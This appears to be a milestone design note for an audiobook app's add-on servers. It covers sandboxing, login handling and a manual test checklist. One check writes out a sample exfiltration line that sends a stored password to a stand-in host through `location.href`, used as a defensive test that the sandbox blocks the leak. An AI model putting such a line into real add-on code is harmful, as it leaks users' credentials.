# M57 Add-ons as library sources

In-app add-ons ([M38](m38.md)) are on par with built-in storage. Protocol revision 5 adds
`settings` (a form the add-on describes; `password` fields sealed on the phone), a `library`
resource that scans a source into the library, and stream `headers`, allowed only for add-ons
inside the app and sent only to their own hosts. Add-on servers appear in Settings → Servers → Add
a server next to WebDAV and S3, scan with the other servers, and play, download and cast with their
login, also with the app closed. HTTP folder is the first bundled one
(`packages/core/src/addons/bundled/http-folder.js`). Add-on code now runs in a worker inside the
sandbox, one sandbox per server, and a login never follows a redirect to another host. The web
build can't send headers with audio, so books from a server with a login play in the Android app
only, as with WebDAV.

Built in stays what needs native code (phone folders, SMB, SFTP) or is the foundation (WebDAV,
S3); see Own storage in the [brief](../brief.md#decisions).

## Open checks

- [ ] (you) The sandbox now runs an add-on's code in a worker inside the WebView. Install
      `examples/in-app-addon/home-shelf.js` and check Home still gets its catalog; then add an HTTP
      folder server with a login: it connects. If the WebView can't start a worker, adding it says
      “This add-on needs a login, which this device can’t keep apart from it.”: that is the safe
      failure, but means add-on servers don't work on that phone. A file that tries
      `fetch('https://example.org/')` in `library` gets an error, not an answer.
- [ ] (you) An HTTP folder server with a login (nginx `autoindex on` behind `auth_basic`, or Caddy
      `file_server browse` with `basic_auth`): its books scan into the Library, play with the screen
      off, download on Wi-Fi, and keep playing from the download in flight mode.
- [ ] (you) With the app swiped away, a book from that server plays from the notification and from
      Android Auto (the login travels in the playback service's journal, as WebDAV's does).
- [ ] (you) Cast a book from that server to a speaker: the phone serves it with the login, the speaker
      plays it.
- [ ] (you) Settings → Rescan picks up a book added to the server folder and marks a removed one
      missing; restart the app and the server scans with the others.
- [ ] (you) Restore a backup on another phone: the HTTP folder server shows “Password needed”, Log in
      asks only for the password (address and user kept), and its books come back.
- [ ] (you) An add-on file that tries `location.href = 'https://example.org/?x=' + settings.password`
      inside `library`: nothing opens in the browser, nothing leaves the phone. (Before M57, a
      navigation from the sandbox page was handed to the phone's browser.)
- [ ] (you) A server that redirects its audio to another host (a signed link on a CDN): playback,
      casting and tag reading follow it without the login, and the book plays.
- [ ] (you) Install an add-on file with a library, add a server with it, then install a different file
      with the same ID: the review says the servers ask for their login again, Settings → Servers
      shows “The add-on changed”, and nothing is scanned until Log in.
